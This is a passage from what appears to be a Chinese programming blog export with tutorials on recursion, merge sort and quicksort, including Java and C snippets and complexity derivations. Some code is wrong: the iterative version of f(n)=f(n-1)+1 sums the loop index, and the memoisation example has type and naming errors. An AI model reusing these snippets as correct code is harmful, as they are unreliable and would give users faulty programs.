color=\"red\"><strong>写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。</strong></font></p>\n<p>讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。</p>\n<p>上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。</p>\n<p>但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。</p>\n<p>像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个”递”和”归”的过程一步一步都想清楚。</p>\n<p>计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。</p>\n<p>对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？</p>\n<p>如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。</p>\n<p>因此，编写递归代码的关键是，<strong>只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤</strong></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"递归代码警惕堆栈溢出\"><a href=\"#递归代码警惕堆栈溢出\" class=\"headerlink\" title=\"递归代码警惕堆栈溢出\"></a>递归代码警惕堆栈溢出</h3></div><br></div>\n\n<p>在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？</p>\n<p>在”栈”那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。</p>\n<p>比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread <span class=\"string\">\"main\"</span> java.lang.StackOverflowError</span><br></pre></td></tr></table></figure></p>\n<p>那么如何避免堆栈溢出呢？</p>\n<p>我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n&lt;=0。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 表示递归的深度</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> depth = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t++depth;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(depth&gt;<span class=\"number\">1000</span>)<span class=\"keyword\">throw</span> exception;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"递归代码警惕重复计算\"><a href=\"#递归代码警惕重复计算\" class=\"headerlink\" title=\"递归代码警惕重复计算\"></a>递归代码警惕重复计算</h3></div><br></div>\n\n<p>除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的：<br><img src=\"/posts/2018-09-18-算法-递归/台阶递归图.jpg\"></p>\n<p>从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。</p>\n<p>为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。</p>\n<p>按照上面的思路，我们再来改造一下代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Map&lt;String, Integer&gt; map = <span class=\"keyword\">new</span> Hashmap&lt;&gt;();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(map.containsKey(n))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> map.get(n);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = f(n-<span class=\"number\">1</span>) + f(n-<span class=\"number\">2</span>);</span><br><span class=\"line\">\tmap.put(n, ret);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。</p>\n<p>在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"怎样将递归代码改写为非递归代码\"><a href=\"#怎样将递归代码改写为非递归代码\" class=\"headerlink\" title=\"怎样将递归代码改写为非递归代码\"></a>怎样将递归代码改写为非递归代码</h3></div><br></div>\n\n<p>我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。</p>\n<p>那我们是否可以将递归代码改写为非递归代码呢？</p>\n<p>仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">2</span>; i&lt;=n; ++i)&#123;</span><br><span class=\"line\">\t\tret = ret+i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>同样，第二个例子也可以改写为非递归的方式实现。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>)<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>)<span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> prepre = <span class=\"number\">1</span>; <span class=\"comment\">// f(1)=1</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> pre = <span class=\"number\">2</span>;    <span class=\"comment\">// f(2)=2</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">3</span>;i&lt;=n;++i)&#123; <span class=\"comment\">//f(3) = f(2)+f(1)</span></span><br><span class=\"line\">\t\tret = pre + prepre;</span><br><span class=\"line\">\t\tprepre = pre;</span><br><span class=\"line\">\t\tpre = ret;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那是不是所有的递归代码都可以改写为这种<strong>迭代循环</strong>的非递归写法呢？</p>\n<p>笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。</p>\n<p>但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">long</span> <span class=\"title\">findRootRefererId</span><span class=\"params\">(<span class=\"keyword\">long</span> actorId)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">long</span> refererId = select referer_id from [table] where actor_id = actorId;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(refererId == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span> actorId;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> findRootRefererId(refererId)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。</p>\n<p>第一，如果递归很深，可能会有堆栈溢出问题。</p>\n<p>第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。</p>\n<p>不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。</p>\n<p>递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。</p>\n<h3 id=\"思考题\"><a href=\"#思考题\" class=\"headerlink\" title=\"思考题\"></a>思考题</h3><p>1、 递归代码的时间复杂度该如何分析？</p>\n<p>2、 递归代码如何调试呢？你有什么好的调试方法吗？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-排序(中)","date":"2018-09-23T03:44:14.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，**归并排序**和**快速排序**。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。\n\n归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：**如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？**，这就要用到今天讲的内容。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 归并排序的原理\n{% endnote %}\n</div>\n\n我们先来看看**归并排序**。\n\n归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。\n\n{% asset_img 归并排序原理图.jpg 归并排序原理图 %}\n\n归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。\n\n从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。**分治是一种解决问题的处理思想，递归是一种编程技巧**，这两者并不冲突。\n\n前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。\n\n我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。\n\n```java\n递推公式\nmerge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+1...r))\n\n终止条件\np>=r 不在继续分解\n```\n\n我来解释一下这个公式，merge_sort(p...r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p...q)和merge_sort(q+1...r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。\n\n有了递推公式，转化成代码就简单多了。\n\n```java\n// 归并排序\npublic static void merge_sort(int[] a, int n){\n    merge_sort(a, 0, n-1);\n}\nprivate static void merge_sort(int[] a, int p, int r){\n    // 递归终止条件\n    if (p>=r) return;\n    // 获取分区点\n    int q = p + (r-p)/2;\n    // 分治排序左边\n    merge_sort(a, p, q);\n    // 分治排序右边\n    merge_sort(a, q+1, r);\n    // 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r]\n    merge(a, p, q, r);\n}\n\n// 合并数组\nprivate static void merge(int[] a, int p, int q, int r){\n    int i = p;\n    int j = q + 1;\n    int k = 0;\n    // 合并数组 a[p, q]  a[q+1, r] 到临时数组temp\n    // 申请一个临时数组\n    int[] temp = new int[r - p + 1];\n    // 根据两个数组最短的长度进行比较添加到temp中\n    while (i<=q&& j<=r){\n        if (a[i]<=a[j]){\n            temp[k++] = a[i++];\n        }else {\n            temp[k++] = a[j++];\n        }\n    }\n\n    // 看哪个数组还没有完成，将其放到temp后\n    if (i<=q){\n        while (i<=q){\n            temp[k++] = a[i++];\n        }\n    }else {\n        while (j<=r){\n            temp[k++] = a[j++];\n        }\n    }\n    System.out.println(Arrays.toString(temp));\n\n    // 将temp中对应的数据放入原数组中\n    for (i = 0; i <= r-p; i++) {\n        a[p+i] = temp[i];\n    }\n}\n```\n\n你可能已经发现了，merge(A[p...r], A[p...q], A[q+1...r])这个函数的作用就是，讲已经有序的A[p...q]和A[q+1...r]合并成另一个有序的数组，并且放入A[p...r]。那这个过程具体该怎么做呢？\n\n如图所示，我们申请一个临时数组temp，大小与A[p...r]相同。我们用两个指针i，j分别指向A[p...q]和A[q+1...r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。\n\n继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p...r]中。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 归并排序的性能分析\n{% endnote %}\n</div>\n\n还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。\n\n**第一、 归并排序是稳定的排序算法吗？**\n\n结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。\n\n在合并的过程中，如果A[p...q]和A[q+1...r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p...q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。\n\n**第二、归并排序的时间复杂度是多少？**\n\n归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。\n\n在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。\n\n我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。\n\n从上面的分析，我们得出一个重要的结论：**不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式**。\n\n套用这个公式，我们来分析一下归并排序的时间复杂度。\n\n我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：\n$$ \n\\begin{cases}\nT(1) = C; & n=1 \\\\\\\\[2ex]\nT(n) = 2\\*T(\\frac{n}{2}) + n; &  n>1 \n\\end{cases}\n$$\n\n通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程\n\n$$\n\\\\begin{align\\*}\nT(n) \\\\ &= \\\\ 2\\*T(\\frac{n}{2}) \\\\ + \\\\ n \\\\\\\\[2ex]\n&= 2\\*(2 \\* T(\\frac{n}{4}) + \\frac{n}{2}) \\\\  + \\\\ n \\qquad = 4\\*T(\\frac{n}{4}) + 2\\*n \\\\\\\\[2ex]\n&= 4\\*(2\\* T(\\frac{n}{8}) + \\frac{n}{4}) \\\\  + \\\\ 2 \\* n \\\\ \\; = 8\\*T(\\frac{n}{8}) + 3\\*n \\\\\\\\[2ex]\n&= 8\\*(2\\* T(\\frac{n}{16}) + \\frac{n}{8}) \\\\  + \\\\ 3 \\* n \\\\ \\; = 16\\*T(\\frac{n}{16}) + 4\\*n \\\\\\\\[2ex]\n&= ...... \\\\\\\\[2ex]\n&= 2^{k} \\* T(\\frac{n}{2^{k}}) + k \\* n\n\\\\end{align\\*}\n$$\n\n这样一步步推导，我们可以得到$T(n) \\\\ = \\\\ 2^{k} \\* T(\\frac{n}{2^{k}}) + k \\* n $。当$T(\\frac{n}{2^{k}})=T(1)$时，也就是$\\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \\\\ = \\\\ Cn + n\\*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n\\*log_{2}n)$。所以归并排序的时间复杂度是$O(n\\*log_{2}n)$。\n\n从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n\\*log_{2}n)$。\n\n**第三、归并排序是不是原地排序算法呢？**\n\n归并排序的时间复杂度在任何情况下都是$O(n\\*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。\n\n这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n\\*log_{2}n)$，该如何分析呢？\n\n如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n\\*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？\n\n实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 快速排序的原理\n{% endnote %}\n</div>\n\n我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。\n\n快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。\n\n第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。\n\n根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。\n\n如果我们用递推公式来将上面的过程写出来的话，就是这样：\n\n```java\n# 递推公式\nquick_sort(p...r) = quick_sort(p...q-1)+quick_sort(q+1...r)\n\n# 终止条件\np>=r\n```\n\n我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。\n\n```java\nprivate static void quickSort(int[] arr, int n) {\n    if (n < 1) return;\n    quickSort(arr, 0 , n-1);\n}\nprivate static void quickSort(int[] arr, int left, int right) {\n    if (left>=right) return; \n    int mid = partation(arr, left, right);\n    quickSort(arr, left, mid-1);\n    quickSort(arr, mid+1, right);\n}\n\n// 查找中间位置\nprivate static int partation(int[] arr, int left, int right) {\n    int base = arr[left];\n    int i = left, j = right;\n\n    while(i<j){\n        while (i<j && arr[j] >= base) j--;\n        while (i<j && arr[i] <= base) i++;\n\n        if (i<j){\n            int temp = arr[i];\n            arr[i] = arr[j];\n            arr[j] = temp;\n        }\n    }\n\n    arr[left] = arr[i];\n    arr[i] = base;\n    return i;\n\n}\n\n// 查找中间位置\nprivate static int partation1(int[] a, int left, int right){\n    int pivot = a[right];\n    int i = left;\n    for (int j=left; j<=right-1;j++){\n        if (a[j]<pivot){\n            int temp = a[i];\n            a[i] = a[j];\n            a[j] = temp;\n            i++;\n        }\n    }\n    a[right] = a[i];\n    a[i] = pivot;\n    return i;\n}\n```\n\n归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p...r]分区，函数返回pivot的小标。\n\n如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p...r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p...r]中。\n\n不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p...r]原地完成分区操作。\n\n原地分区函数的实现思路非常巧妙，我下面用伪代码实现：\n\n```java\npartation(a,p,r){\n    pivot := A[r]\n    i := p;\n\n    for j:=p to r-1 do {\n        if A[j] < pivot{\n            swap A[i] with A[j]\n            i := i+1\n        }\n    }\n    swap A[i] with A[r]\n    return i\n}\n```\n这里的处理有点类似于选择排序。我们通过游标i把A[p...r-1]分成了两部分，A[p...i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i...r-1] 是“未处理区间”。我们每次从未处理区间A[i...r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。\n\n数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。\n\n因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。\n\n到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？\n\n可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n\\*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 快速排序的性能分析\n{% endnote %}\n</div>\n\n现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。\n\n快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n\\*log_{2}n)$。\n\n$$ \n\\\\begin{cases} \\\\\\\n\\\\ T(1) = C; & n=1 \\\\\\\\[2ex]\n\\\\ T(n) = 2\\*T(\\frac{n}{2}) + n; &  n>1\n\\\\end{cases}\n$$\n\n但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。\n\n我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n\\*log_{2}n)$退化成了$O(n^2)$。\n\n我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？\n\n实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n\\*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote 